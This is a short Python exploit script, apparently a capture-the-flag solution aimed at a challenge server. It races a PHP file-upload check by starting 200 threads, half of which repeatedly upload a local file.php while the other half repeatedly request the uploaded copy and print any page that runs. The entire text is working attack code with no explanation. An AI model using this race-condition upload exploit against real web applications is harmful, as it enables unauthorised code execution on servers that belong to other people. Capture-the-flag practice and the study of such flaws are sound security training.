#!/usr/bin/python

import requests
import threading

BASE_URL = "http://challs1.nusgreyhats.org:5207/"
FILE = "file.php"
THREADS = 200
LOOPS = 25

# thread class
class postThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = str(threadID).zfill(3)
        self.name = name
        self.counter = str(counter).zfill(3)
        self.session = requests.Session()

    def run(self):
        self.session.get(BASE_URL)
        for _ in range(LOOPS):
            post_file(self.threadID, self.session)

# thread class
class getThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = str(threadID).zfill(3)
        self.name = name
        self.counter = str(counter).zfill(3)
        self.session = requests.Session()

    def run(self):
        self.session.get(BASE_URL)
        for _ in range(LOOPS):
            get_file(self.threadID, self.session)

# get file
def get_file(id, session):
    site = session.get(BASE_URL + "upload/" + FILE)
    page = site.text
    if 'Not Found' not in page and 'Fatal error' not in page:
        print("PAGE FOUND")
        print(page)

# post file
def post_file(id, session):
    file_map = {
        "upload_file": (FILE, open(FILE, "r"), "application/octet-stream"), 
        'submit': (None, 'trust_me_this_is_not_flag')
    }

    site = session.post(BASE_URL + "upload.php", files=file_map)
    if site.status_code != 200:
        print("UPLOAD FAIL!")
        print(site.text)

# main logic here
def main():
    # create new threads
    threads = list(map(lambda num: 
            getThread(num, f"Thread-{num}", num) 
            if (num % 2 == 1) 
            else postThread(num, f"Thread-{num}", num), 
        list(range(THREADS))))

    # start new threads
    for thread in threads:
        thread.start()

# driver code
if __name__ == "__main__":
    main()